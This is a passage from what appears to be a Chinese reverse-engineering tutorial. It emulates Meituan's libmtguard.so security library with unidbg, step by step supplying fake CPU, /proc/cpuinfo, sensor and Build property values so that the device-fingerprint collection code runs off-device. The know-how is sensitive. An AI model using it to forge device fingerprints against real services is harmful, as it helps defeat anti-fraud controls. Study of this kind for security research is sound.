&quot;e8c17f92755628eaeec9e7e53ee668d7&quot;, 0x4000000000000000)) &#123;          return PatchProxy.accessDispatch(objArray, this, changeQuickR, i, &quot;e8c17f92755628eaeec9e7e53ee668d7&quot;);       &#125;       String str = &quot;&quot;;       int i1 = 0;       try&#123;          super(new InputStreamReader(new FileInputStream(&quot;/proc/cpuinfo&quot;)));          try&#123;             while ((str1 = this.readLine()) != null) &#123;                if (str1.startsWith(&quot;Processor&quot;)) &#123;                   str = &quot;arm&quot;;                   break ;                &#125;else if(str1.startsWith(&quot;model name&quot;))&#123;                   str = &quot;x86&quot;;                   break ;                &#125;             &#125;             this.close();          label_005e :             this.safeClose(uCloseable);             return str;          &#125;catch(java.lang.Exception e1)&#123;          &#125;          c.a(throwable);          MTGuardLog.error(throwable);          goto label_005e ;       &#125;catch(java.lang.Exception e2)&#123;          uCloseable = i1;          throwable = e2;       &#125;    &#125;</code></pre><p>根据方法名和代码逻辑可知，该方法就是读取 <strong>&#x2F;proc&#x2F;cpuinfo</strong> 文件，根据内容判断 CPU 架构类型(arm&#x2F;x86)，继续补环境</p><pre><code class="language-Java">// CPU 架构case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getCpuInfoType()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;arm&quot;);&#125;</code></pre><p>运行，报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/BufferedReader-&gt;allocObjectat com.github.unidbg.linux.android.dvm.AbstractJni.allocObject(AbstractJni.java:812)at com.test4.TEST4.allocObject(TEST4.java:93)at com.github.unidbg.linux.android.dvm.DvmClass.allocObject(DvmClass.java:74)at com.github.unidbg.linux.android.dvm.DalvikVM$24.handle(DalvikVM.java:365)</code></pre><p>前面也遇到过一个 <strong>allocObject</strong>，你可能想如法炮制</p><pre><code class="language-Java">case &quot;java/io/BufferedReader-&gt;allocObject&quot;:&#123;    return ProxyDvmObject.createObject(vm, new BufferedReader());&#125;</code></pre><p>但最好不要这么做了，这是有隐患的处理方法。BufferedReader 没有无参构造函数，它所需要的初始化参数在 <strong>allocObject</strong> 阶段并没有展露出来，在后续真正初始化的时候才有值。</p><p>这里直接用空的 <strong>dvmObject</strong> 占位，这里的 dvmClass 等价于 <strong>vm.resolveClass(“java&#x2F;io&#x2F;BufferedReader”)</strong>。</p><pre><code class="language-Java">    @Override    public DvmObject&lt;?&gt; allocObject(BaseVM vm, DvmClass dvmClass, String signature) &#123;        switch (signature) &#123;            case &quot;java/lang/StringBuilder-&gt;allocObject&quot;: &#123;                return ProxyDvmObject.createObject(vm, new StringBuilder());            &#125;            case &quot;java/io/BufferedReader-&gt;allocObject&quot;: &#123;                return dvmClass.newObject(null);            &#125;        &#125;        return super.allocObject(vm, dvmClass, signature);    &#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/InputStreamReader-&gt;allocObjectat com.github.unidbg.linux.android.dvm.AbstractJni.allocObject(AbstractJni.java:812)at com.test4.TEST4.allocObject(TEST4.java:96)at com.github.unidbg.linux.android.dvm.DvmClass.allocObject(DvmClass.java:74)</code></pre><p>是 InputStreamReader，同样占位处理</p><pre><code class="language-Java">case &quot;java/io/InputStreamReader-&gt;allocObject&quot;:&#123;    return dvmClass.newObject(signature);&#125;</code></pre><p>运行报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/FileInputStream-&gt;allocObjectat com.github.unidbg.linux.android.dvm.AbstractJni.allocObject(AbstractJni.java:812)at com.test4.TEST4.allocObject(TEST4.java:102)at com.github.unidbg.linux.android.dvm.DvmClass.allocObject(DvmClass.java:74)</code></pre><p>是 <strong>FileInputStream</strong>，同理</p><pre><code class="language-Java">case &quot;java/io/FileInputStream-&gt;allocObject&quot;:&#123;    return dvmClass.newObject(signature);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/FileInputStream-&gt;&lt;init&gt;(Ljava/lang/String;)Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:115)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)</code></pre><p>终于到了调用其 <strong>init</strong> 函数做初始化的逻辑，因为 <strong>callVoid</strong> 系列 API 没有返回值，它的操作基于原先的占位 <strong>dvmObject</strong>，因为我们没法对它重新复制，所以我声明一个全局变量处理它以及后面的逻辑，应该说挺麻烦的。</p><pre><code class="language-Java">public class TEST4 extends AbstractJni implements IOResolver &#123;    private final AndroidEmulator emulator;    private final DvmObject&lt;?&gt; SIUACollector;    private final VM vm;    public FileInputStream fileInputStream;</code></pre><p>然后补具体逻辑</p><pre><code class="language-Java">case &quot;java/io/FileInputStream-&gt;&lt;init&gt;(Ljava/lang/String;)V&quot;:&#123;    String name = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;FileInputStream:&quot;+name);    try &#123;        fileInputStream = new FileInputStream(name);    &#125; catch (FileNotFoundException e) &#123;        e.printStackTrace();    &#125;    return;&#125;</code></pre><p>运行发现有问题</p><pre><code class="language-shell">FileInputStream: /proc/cpuinfoJNIEnv-&gt;CallVoidMethodA(java.io.FileInputStream@2ddc8ecb, &lt;init&gt;(&quot;/proc/cpuinfo&quot;)) was called from RX@0x12030391[libmtguard.so]0x30391JNIEnv-&gt;GetMethodID(java/io/InputStreamReader.&lt;init&gt;(Ljava/io/InputStream;)V) =&gt; 0x692aa2f2 was called from RX@0x12006369[libmtguard.so]0x6369[14:33:20 104]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x13b, PC=unidbg@0xfffe0444, LR=RX@0x12029ed7[libmtguard.so]0x29ed7, syscall=nulljava.lang.UnsupportedOperationException: java/io/InputStreamReader-&gt;&lt;init&gt;(Ljava/io/InputStream;)Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:128)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)at com.github.unidbg.linux.android.dvm.DvmMethod.callVoidMethodA(DvmMethod.java:234)at com.github.unidbg.linux.android.dvm.DalvikVM$60.handle(DalvikVM.java:1076)java.io.FileNotFoundException: \proc\cpuinfo (系统找不到指定的路径。)at java.base/java.io.FileInputStream.open0(Native Method)at java.base/java.io.FileInputStream.open(FileInputStream.java:219)</code></pre><p>程序在访问 &#x2F;proc&#x2F;cpuinfo 文件，首先将 &#x2F;proc&#x2F;cpuinfo 文件拖到本地</p><pre><code class="language-shell">└─Δ adb pull /proc/cpuinfo xxx\unidbg\unidbg-android\src\test\java\com\test4* daemon not running; starting now at tcp:5037* daemon started successfully/proc/cpuinfo: 1 file pulled, 0 skipped. 0.2 MB/s (1919 bytes in 0.011s)</code></pre><p>然后做路径重定位</p><pre><code class="language-Java">case &quot;java/io/FileInputStream-&gt;&lt;init&gt;(Ljava/lang/String;)V&quot;:&#123;    String name = vaList.getObjectArg(0).getValue().toString();    if(name.equals(&quot;/proc/cpuinfo&quot;))&#123;        name = &quot;unidbg-android/src/test/java/com/test4/cpuinfo&quot;;    &#125;    System.out.println(&quot;FileInputStream:&quot;+name);    try &#123;        fileInputStream = new FileInputStream(name);    &#125; catch (FileNotFoundException e) &#123;        e.printStackTrace();    &#125;    return;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/InputStreamReader-&gt;&lt;init&gt;(Ljava/io/InputStream;)Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:131)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)at com.github.unidbg.linux.android.dvm.DvmMethod.callVoidMethodA(DvmMethod.java:234)</code></pre><p>同理处理为全局变量</p><pre><code class="language-Java">public class TEST4 extends AbstractJni implements IOResolver &#123;    private final AndroidEmulator emulator;    private final DvmObject&lt;?&gt; SIUACollector;    private final VM vm;    public FileInputStream fileInputStream;    public InputStreamReader inputStreamReader;</code></pre><p>补方法逻辑</p><pre><code class="language-Java">case &quot;java/io/InputStreamReader-&gt;&lt;init&gt;(Ljava/io/InputStream;)V&quot;:&#123;    inputStreamReader = new InputStreamReader(fileInputStream);    return;&#125;</code></pre><p>这个 InputStream 参数就是我们之前定义的全局变量 InputStream，所以拿过来用。</p><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/BufferedReader-&gt;&lt;init&gt;(Ljava/io/Reader;)Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:137)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)</code></pre><p>这三个其实就是一连套的…</p><pre><code class="language-Java">public class TEST4 extends AbstractJni implements IOResolver &#123;    private final AndroidEmulator emulator;    private final DvmObject&lt;?&gt; SIUACollector;    private final VM vm;    public FileInputStream fileInputStream;    public InputStreamReader inputStreamReader;    public BufferedReader bufferedReader;</code></pre><p>处理</p><pre><code class="language-Java">case &quot;java/io/BufferedReader-&gt;&lt;init&gt;(Ljava/io/Reader;)V&quot;:&#123;    bufferedReader = new BufferedReader(inputStreamReader);    return;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/BufferedReader-&gt;readLine()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:180)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>似乎回归到了我们更熟悉的逻辑里了</p><pre><code class="language-Java">case &quot;java/io/BufferedReader-&gt;readLine()Ljava/lang/String;&quot;:&#123;    String oneline;    try &#123;        oneline = bufferedReader.readLine();        if(oneline != null)&#123;            return new StringObject(vm, oneline);        &#125;else &#123;            return null;        &#125;    &#125; catch (IOException e) &#123;        e.printStackTrace();    &#125;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/String-&gt;compareToIgnoreCase(Ljava/lang/String;)Iat com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:563)at com.test4.TEST4.callIntMethodV(TEST4.java:234)at com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:529)</code></pre><p>JDK 方法，正常补即可</p><pre><code class="language-Java">case &quot;java/lang/String-&gt;compareToIgnoreCase(Ljava/lang/String;)I&quot;:&#123;    String str = vaList.getObjectArg(0).getValue().toString();    return dvmObject.getValue().toString().compareToIgnoreCase(str);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/String-&gt;lastIndexOf(I)Iat com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:563)at com.test4.TEST4.callIntMethodV(TEST4.java:238)at com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:529)</code></pre><p>依旧是 JDK 方法</p><pre><code class="language-Java">case &quot;java/lang/String-&gt;lastIndexOf(I)I&quot;:&#123;    return dvmObject.getValue().toString().lastIndexOf(vaList.getIntArg(0));&#125;</code></pre><p>继续运行和补环境</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/String-&gt;substring(I)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:194)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>补</p><pre><code class="language-Java">case &quot;java/lang/String-&gt;substring(I)Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, dvmObject.getValue().toString().substring(vaList.getIntArg(0)));&#125;</code></pre><p>报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/StringBuilder-&gt;append(I)Ljava/lang/StringBuilder;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:197)</code></pre><p>补环境</p><pre><code class="language-Java">            case &quot;java/lang/StringBuilder-&gt;append(I)Ljava/lang/StringBuilder;&quot;: &#123;                int value = vaList.getIntArg(0); // 直接取 int                ((StringBuilder) dvmObject.getValue()).append(value); // 自动转成字符串拼接                return dvmObject; // append 返回 this            &#125;</code></pre><p>继续运行报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/BufferedReader-&gt;close()Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:139)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;java/io/BufferedReader-&gt;close()V&quot;:&#123;    try &#123;        bufferedReader.close();    &#125; catch (IOException e) &#123;        e.printStackTrace();    &#125;    return;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/hardware/SensorManager-&gt;getDefaultSensor(I)Landroid/hardware/Sensor;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:229)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>传感器一向是收集信息的重点，处理它需要更多的耐心。</p><p>首先是这个 API 的原型</p><pre><code class="language-Java">Sensor getDefaultSensor(int type)</code></pre><p>它会从传感器服务获取指定类型的传感器，有相当多的类型，详见 Android <a href="http://aospxref.com/android-8.0.0_r36/xref/frameworks/base/core/java/android/hardware/Sensor.java">源码</a>。</p><pre><code class="language-Java">public static final int TYPE_ACCELEROMETER = 1;public static final int TYPE_ORIENTATION = 3;public static final int TYPE_POSE_6DOF = 28;public static final int TYPE_PRESSURE = 6;public static final int TYPE_PROXIMITY = 8;public static final int TYPE_RELATIVE_HUMIDITY = 12;public static final int TYPE_ROTATION_VECTOR = 11;public static final int TYPE_SIGNIFICANT_MOTION = 17;public static final int TYPE_STATIONARY_DETECT = 29;public static final int TYPE_STEP_COUNTER = 19;public static final int TYPE_STEP_DETECTOR = 18;public static final int TYPE_GRAVITY = 9;</code></pre><p>打印参数，看看样本在获取哪类传感器</p><pre><code class="language-Java">case &quot;android/hardware/SensorManager-&gt;getDefaultSensor(I)Landroid/hardware/Sensor;&quot;:&#123;    int type = vaList.getIntArg(0);    System.out.println(&quot;Sensor type:&quot;+type);&#125;</code></pre><p>运行</p><pre><code class="language-Java">Sensor type:1</code></pre><p>1 对应于加速度传感器，下面做常规补环境，将 type 设为 DvmObject 的值，因为担心样本会获取多种传感器，所以提前处理，便于区分。</p><pre><code class="language-Java">case &quot;android/hardware/SensorManager-&gt;getDefaultSensor(I)Landroid/hardware/Sensor;&quot;:&#123;    int type = vaList.getIntArg(0);    return vm.resolveClass(&quot;android/hardware/Sensor&quot;).newObject(type);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/hardware/Sensor-&gt;getName()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:234)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>这里是在获取传感器的名字</p><p>读者可以写一个 Android Java 层 demo，来理解这里的逻辑，在 JNI 中看起来有点懵，但 Java 复写其实相当简单</p><pre><code class="language-Java">SensorManager manager= (SensorManager)getSystemService(SENSOR_SERVICE);Sensor accelSensor = manager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);Log.e(&quot;lilac sensor Name&quot;,accelSensor.getName());</code></pre><p>在我的测试机上返回 ACCELEROMETER</p><p>收集传感器的信息，可以一定程度上阻止 “改机” ，国内主要品牌、主要型号 所对应的传感器信息都可以查到，如果你修改了 Android 设备信息，比如从 pixel 改成 红米 K40，那么对应的，各类传感器信息也要改。如果不协调同步地改，就会有破绽。</p><p>继续补环境</p><pre><code class="language-Java">case &quot;android/hardware/Sensor-&gt;getName()Ljava/lang/String;&quot;:&#123;    int type = (Integer) dvmObject.getValue();    System.out.println(&quot;Sensor type: &quot; + type);    if(type == 1)&#123;        return new StringObject(vm, &quot;ACCELEROMETER&quot;);    &#125;else &#123;        throw new UnsupportedOperationException(signature);    &#125;&#125;</code></pre><p>运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/hardware/Sensor-&gt;getVendor()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:244)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>传感器有一系列可供获取的属性。</p><ul><li>getMaximumRange() 最大取值范围</li><li>getName() 设备名称</li><li>getPower() 功率</li><li>getResolution() 精度</li><li>getType() 传感器类型</li><li>getVentor() 设备供应商</li><li>getVersions() 设备版本号</li></ul><p>这里是在获取设备供应商信息，在 Android demo 中如法炮制</p><pre><code class="language-Java">SensorManager manager= (SensorManager)getSystemService(SENSOR_SERVICE);Sensor accelSensor = manager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);Log.e(&quot;lilac sensor Name&quot;,accelSensor.getName());Log.e(&quot;lilac sensor Vendor&quot;,accelSensor.getVendor());</code></pre><p>运行demo，看下日志就知道了<br>我的测试机返回的是，<strong>lsm6dsoe_acc</strong>，是 STMicroelectronics (ST) 生产的 MEMS 传感器。继续补环境</p><pre><code class="language-Java">case &quot;android/hardware/Sensor-&gt;getVendor()Ljava/lang/String;&quot;:&#123;    int type = (int) dvmObject.getValue();    System.out.println(&quot;Sensor getVendor:&quot; + type);    if(type == 1)&#123;        return new StringObject(vm, &quot;lsm6dsoe_acc&quot;);    &#125;else &#123;        throw new UnsupportedOperationException(signature);    &#125;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">[!] Sensor type(getName): 9[15:14:41 209]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x120, PC=unidbg@0xfffe0294, LR=RX@0x1202ad4f[libmtguard.so]0x2ad4f, syscall=nulljava.lang.UnsupportedOperationException: android/hardware/Sensor-&gt;getName()Ljava/lang/String;at com.test4.TEST4.callObjectMethodV(TEST4.java:240)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>可以看到，它又获得了另一种传感器，9 是 TYPE_GRAVITY 即重力传感器。将 Android demo 稍加修改</p><pre><code class="language-Java">SensorManager manager= (SensorManager)getSystemService(SENSOR_SERVICE);Sensor accelSensor = manager.getDefaultSensor(Sensor.TYPE_GRAVITY);Log.e(&quot;lilac sensor Name&quot;,accelSensor.getName());Log.e(&quot;lilac sensor Vendor&quot;,accelSensor.getVendor());</code></pre><p>传感器名为 GRAVITY，vendor 是 MTK，继续完善补环境</p><pre><code class="language-Java">case &quot;android/hardware/Sensor-&gt;getName()Ljava/lang/String;&quot;:&#123;    int type = (int) dvmObject.getValue();    System.out.println(&quot;Sensor getName:&quot;+type);    if(type == 1)&#123;        return new StringObject(vm, &quot;ACCELEROMETER&quot;);    &#125;else if(type == 9)&#123;        return new StringObject(vm, &quot;GRAVITY&quot;);    &#125;    else &#123;        throw new UnsupportedOperationException(signature);    &#125;&#125;case &quot;android/hardware/Sensor-&gt;getVendor()Ljava/lang/String;&quot;:&#123;    int type = (int) dvmObject.getValue();    System.out.println(&quot;Sensor getVendor:&quot;+type);    if(type == 1)&#123;        return new StringObject(vm, &quot;lsm6dsoe_acc&quot;);    &#125;else if(type == 9)&#123;        return new StringObject(vm, &quot;MTK&quot;);    &#125;    else &#123;        throw new UnsupportedOperationException(signature);    &#125;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;safeClose(Ljava/io/Closeable;)Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:147)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)at com.github.unidbg.linux.android.dvm.DvmMethod.callVoidMethodA(DvmMethod.java:234)</code></pre><p>在 Jadx 中查看对应的反编译代码</p><pre><code class="language-Java">private void safeClose(Closeable closeable) &#123;    Object[] objArr = &#123;closeable&#125;;    ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;    if (PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;148f9159176b748328c0fe05c9308265&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;        PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;148f9159176b748328c0fe05c9308265&quot;);    &#125; else &#123;        MTGUtils.safeClose(closeable);    &#125;&#125;</code></pre><p>看起来是处理完之后的资源关闭操作，简单处理即可</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;safeClose(Ljava/io/Closeable;)V&quot;:&#123;    return;&#125;</code></pre><p>继续运行，发现已经跑完了</p><pre><code class="language-shell">[*] getHWEquipmentInfo:-|MT6893Z/CZA|8|ACCELEROMETER|lsm6dsoe_acc|GYROSCOPE|MTK|</code></pre><h3 id="八、getHWProperty"><a href="#八、getHWProperty" class="headerlink" title="八、getHWProperty"></a>八、getHWProperty</h3><p>发起调用</p><pre><code class="language-Java">public String getHWProperty()&#123;    String result = SIUACollector.callJniMethodObject(emulator, &quot;getHWProperty()Ljava/lang/String;&quot;).getValue().toString();    return result;&#125;</code></pre><p>新一轮的补环境</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Build-&gt;BOARD:Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53)at com.github.unidbg.linux.android.dvm.DvmField.getStaticObjectField(DvmField.java:106)</code></pre><p>对于 Build 下的数据，同样可以写 demo 看，这个办法灵活好用，或者使用 ADB 也行。这里就直接使用 adb 指令了</p><pre><code class="language-shell">└─Δ adb shellares:/ $ getprop | grep board[ro.board.first_api_level]: [30][ro.board.platform]: [mt6893][ro.miui.has_security_keyboard]: [1][ro.product.board]: [ares][sys.haptic.intensityforkeyboard]: [true]</code></pre><p>补环境</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; getStaticObjectField(BaseVM vm, DvmClass dvmClass, String signature) &#123;    switch (signature)&#123;        case &quot;android/os/Build-&gt;BOARD:Ljava/lang/String;&quot;:&#123;            return new StringObject(vm, &quot;mt6893&quot;);        &#125;    &#125;    return super.getStaticObjectField(vm, dvmClass, signature);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Build-&gt;MANUFACTURER:Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.test4.TEST4.getStaticObjectField(TEST4.java:366)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53)at com.github.unidbg.linux.android.dvm.DvmField.getStaticObjectField(DvmField.java:106)</code></pre><p>同理</p><pre><code class="language-shell">ares:/ $ getprop | grep manufacturer[ro.product.bootimage.manufacturer]: [xiaomi][ro.product.manufacturer]: [Xiaomi][ro.product.odm.manufacturer]: [Xiaomi][ro.product.product.manufacturer]: [Xiaomi][ro.product.system.manufacturer]: [xiaomi][ro.product.system_ext.manufacturer]: [xiaomi][ro.product.vendor.manufacturer]: [Xiaomi][ro.product.vendor_dlkm.manufacturer]: [xiaomi][ro.soc.manufacturer]: [Mediatek]</code></pre><p>结果是 Xiaomi，补环境</p><pre><code class="language-Java">case &quot;android/os/Build-&gt;MANUFACTURER:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;Xiaomi&quot;);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Build-&gt;BRAND:Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.test4.TEST4.getStaticObjectField(TEST4.java:369)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53)at com.github.unidbg.linux.android.dvm.DvmField.getStaticObjectField(DvmField.java:106)</code></pre><p>brand 肯定是红米，不过还是运行一下看看</p><pre><code class="language-shell">ares:/ $ getprop | grep brand[ro.product.bootimage.brand]: [redmi][ro.product.brand]: [Redmi][ro.product.odm.brand]: [Redmi][ro.product.product.brand]: [Redmi][ro.product.system.brand]: [redmi][ro.product.system_ext.brand]: [redmi][ro.product.vendor.brand]: [Redmi][ro.product.vendor_dlkm.brand]: [redmi]</code></pre><p>结果是 Redmi</p><pre><code class="language-Java">case &quot;android/os/Build-&gt;BRAND:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;Redmi&quot;);&#125;</code></pre><p>继续运行，接着是 MODEL</p><pre><code class="language-Java">java.lang.UnsupportedOperationException: android/os/Build-&gt;MODEL:Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.test4.TEST4.getStaticObjectField(TEST4.java:372)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53)</code></pre><p>同理</p><pre><code class="language-shell">ares:/ $ getprop | grep model[ro.product.bootimage.model]: [ares][ro.product.model]: [M2012K10C][ro.product.odm.model]: [M2012K10C][ro.product.product.model]: [M2012K10C][ro.product.system.model]: [missi][ro.product.system_ext.model]: [missi][ro.product.vendor.model]: [M2012K10C][ro.product.vendor_dlkm.model]: [ares][ro.soc.model]: [MT6893]</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;android/os/Build-&gt;MODEL:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;M2012K10C&quot;);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getSysProp(Ljava/lang/String;)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:269)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>getSysProp 是一个用于获取系统属性的工具函数，反编译代码如下。</p><pre><code class="language-Java">public static String getSysProp(String str) &#123;    Object[] objArr = &#123;str&#125;;    ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;    if (PatchProxy.isSupport(objArr, null, changeQuickRedirect2, true, &quot;31aaabc5cd1287cb6e2e62ee32d788e0&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;        return (String) PatchProxy.accessDispatch(objArr, null, changeQuickRedirect2, true, &quot;31aaabc5cd1287cb6e2e62ee32d788e0&quot;);    &#125;    if (TextUtils.isEmpty(str)) &#123;        return &quot;&quot;;    &#125;    try &#123;        Class&lt;?&gt; cls = Class.forName(&quot;android.os.SystemProperties&quot;);        return (String) cls.getDeclaredMethod(&quot;get&quot;, String.class).invoke(cls, str);    &#125; catch (Throwable th) &#123;        c.a(th);        MTGuardLog.error(th);        return &quot;&quot;;    &#125;&#125;</code></pre><p>浅浅打印一下参数</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getSysProp(Ljava/lang/String;)Ljava/lang/String;&quot;:&#123;    String name = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;getSysProp:&quot;+name);&#125;</code></pre><p>运行代码</p><pre><code class="language-shell">[!] getSysProp: ro.product.cpu.abi[15:54:43 498]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x120, PC=unidbg@0xfffe0294, LR=RX@0x1200d2a7[libmtguard.so]0xd2a7, syscall=nulljava.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getSysProp(Ljava/lang/String;)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:273)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)at com.github.unidbg.linux.android.dvm.DalvikVM$33.handle(DalvikVM.java:578)</code></pre><p>既然是属性信息，用 adb 获取很方便，第一个就是</p><pre><code class="language-shell">ares:/ $ getprop | grep ro.product.cpu.abi[ro.product.cpu.abi]: 